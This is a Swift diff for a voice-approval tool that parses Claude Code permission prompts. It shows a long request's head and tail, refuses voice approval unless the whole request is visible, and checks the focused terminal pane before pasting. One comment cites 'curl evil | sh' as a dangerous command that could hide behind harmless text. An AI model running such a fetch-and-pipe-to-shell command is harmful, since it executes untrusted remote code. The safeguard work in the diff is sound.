@@ -16,13 +16,30 @@ struct RioClaudePrompt: Equatable {
     /// The key that picks a plain "Yes" (never a standing permission); nil when there isn't one.
     let approveKey: String?
     let denyKey: String?
+    /// False when the context ran past the lines Rio reads: the command's head is not in it.
+    var isContextComplete = true
 
-    /// What the confirmation panel shows: the context's end, then the question. Bounded.
+    static let earlierLinesMarker = "[earlier lines not shown]\n"
+    static let middleMarker = "\n[\u{2026} middle not shown \u{2026}]\n"
+
+    /// True when the panel shows the whole request. Only then may it be approved by voice: a
+    /// dangerous head (`curl evil | sh; ` and 600 harmless characters) must never hide behind a
+    /// benign tail (review finding).
+    var isFullyShown: Bool {
+        isContextComplete && context.count <= Self.maxDetailLength - question.count - 1
+    }
+
+    /// What the confirmation panel shows: the context (its head and its tail when it is too long,
+    /// marked as cut), then the question. Bounded by `maxDetailLength`.
     var detail: String {
-        let budget = max(0, Self.maxDetailLength - question.count - 1)
-        guard budget > 1, !context.isEmpty else { return String(question.prefix(Self.maxDetailLength)) }
-        let shown = context.count > budget ? "\u{2026}" + String(context.suffix(budget - 1)) : context
-        return shown + "\n" + question
+        let prefix = isContextComplete ? "" : Self.earlierLinesMarker
+        let budget = max(0, Self.maxDetailLength - question.count - 1 - prefix.count)
+        guard budget > 1, !context.isEmpty else { return String((prefix + question).prefix(Self.maxDetailLength)) }
+        guard context.count > budget else { return prefix + context + "\n" + question }
+        let room = max(0, budget - Self.middleMarker.count)
+        let head = room / 2
+        let shown = String(context.prefix(head)) + Self.middleMarker + String(context.suffix(room - head))
+        return prefix + shown + "\n" + question
     }
 
     /// Identifies this prompt, so an approval runs only against the one the owner saw.
@@ -116,12 +133,14 @@ enum RioClaudeScreen {
         guard options.contains(where: { RioText.matches(#"^yes\b"#, $0.label) }) else { return nil }
         let approve = options.first { RioText.matches(#"^yes\b"#, $0.label) && !isStanding($0.label) }
         let deny = options.first { RioText.matches(#"^no\b"#, $0.label) }
+        let above = context(above: questionIndex, in: lines)
         return RioClaudePrompt(
             question: lines[questionIndex],
-            context: context(above: questionIndex, in: lines),
+            context: above.text,
             options: options,
             approveKey: approve.map { String($0.number) },
-            denyKey: deny.map { String($0.number) }
+            denyKey: deny.map { String($0.number) },
+            isContextComplete: above.isComplete
         )
     }
 
@@ -131,8 +150,10 @@ enum RioClaudeScreen {
         guard let index = nonEmpty.suffix(2).first(where: { RioText.matches(pattern, lines[$0]) }) else { return nil }
         let after = nonEmpty.filter { $0 > index }
         guard after.isEmpty else { return nil }
+        let above = context(above: index, in: lines)
         return RioClaudePrompt(
-            question: lines[index], context: context(above: index, in: lines), options: [], approveKey: "y", denyKey: "n"
+            question: lines[index], context: above.text, options: [], approveKey: "y", denyKey: "n",
+            isContextComplete: above.isComplete
         )
     }
 
@@ -141,15 +162,23 @@ enum RioClaudeScreen {
         return standingPhrases.contains { lowered.contains($0) }
     }
 
-    /// Up to 14 lines above the question, stopping at the previous Claude message.
-    private static func context(above index: Int, in lines: [String]) -> String {
+    static let maxContextLines = 14
+
+    /// Up to `maxContextLines` lines above the question, stopping at the previous Claude message.
+    /// Incomplete when the limit cut off more of the request above.
+    private static func context(above index: Int, in lines: [String]) -> (text: String, isComplete: Bool) {
         var collected = [String]()
         var cursor = index - 1
-        while cursor >= 0, collected.count < 14 {
+        while cursor >= 0, collected.count < maxContextLines {
             let line = lines[cursor]
             if isStatusLine(line), line.first != ">" { break }
             collected.append(line)
             cursor -= 1
+        }
+        var isComplete = true
+        if collected.count >= maxContextLines, cursor >= 0 {
+            let next = lines[cursor]
+            isComplete = isStatusLine(next) && next.first != ">"
         }
         var result = [String]()
         for line in collected.reversed() {
@@ -157,7 +186,7 @@ enum RioClaudeScreen {
             result.append(line)
         }
         while result.last?.isEmpty == true { result.removeLast() }
-        return result.joined(separator: "\n")
+        return (result.joined(separator: "\n"), isComplete)
     }
 }
 
@@ -190,6 +219,22 @@ enum RioClaudeSessionPicker {
             }
         }
         return best
+    }
+}
+
+/// Whether a prompt may be pasted into the pane that has focus. The whole window looking like
+/// Claude Code is not enough: in an iTerm or Warp split the focused pane may be a plain shell,
+/// and the prompt would run there as a command. Pure.
+enum RioClaudePaneCheck {
+    /// `focusedText` is the focused element's own text (nil or empty when it can't be read);
+    /// `paneCount` is how many terminal text areas the window has.
+    static func allowsSend(focusedText: String?, windowText: String, paneCount: Int) -> Bool {
+        if let focused = focusedText, !focused.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
+            return RioClaudeScreen.looksLikeClaudeCode(focused) && RioClaudeScreen.permissionPrompt(in: focused) == nil
+        }
+        // Unreadable focus: only a window with a single pane can be judged by its whole text.
+        return paneCount <= 1 && RioClaudeScreen.looksLikeClaudeCode(windowText)
+            && RioClaudeScreen.permissionPrompt(in: windowText) == nil
     }
 }
 
